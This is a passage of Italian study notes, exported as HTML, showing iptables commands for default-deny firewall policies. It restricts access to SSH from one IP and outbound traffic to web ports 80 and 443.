sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP

#aggiungo policy richieste
sudo iptables -A INPUT -p tcp -dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp -sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT

#aggiungo anche loopback per completezza
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT</code></pre></li></ol><ol type="1" id="22e95fc6-a77c-8079-a411-faf20e40b6c9" class="numbered-list" start="14"><li>Imposta iptables per permettere l’accesso alla macchina solo da ssh (tcp porta 22) con un ip 1.2.3.4 e dalla macchina ad un webserver qualunque (porte tcp 80,443)<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80f9-9b95-f9a183c2f23e" class="code"><code class="language-Bash">#flusho tutto
sudo iptables -F INPUT 
sudo iptables -F OUTPUT
sudo iptables -F FORWARD

#aggiorno la policy per droppare
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP

#aggiungo la policy per il lo
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT

#aggiungo le mie policy 
sudo iptables -A INPUT -p tcp --dport 22 -s 1.2.3.4 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp -m multiport --dport 80,443 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -p tcp -m multiport --sport 80,443 -m state --state ESTABLISHED -j ACCEPT</code></pre><p id="22e95fc6-a77c-8064-a008-fd1239672a47" class=""><span style="border-bottom:0.05em solid">Nota che per bloccare la navigazione internet degli utenti è sufficiente cancellare NEW in output su 80,433 perchè a noi serve solo ESTABLISHED per far funzionare il server</span></p><p id="22e95fc6-a77c-8051-9ef8-c44f8f38359b" class="">
</p></li></ol></div></p><p id="22e95fc6-a77c-80af-80c7-f2355d86ddcd" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>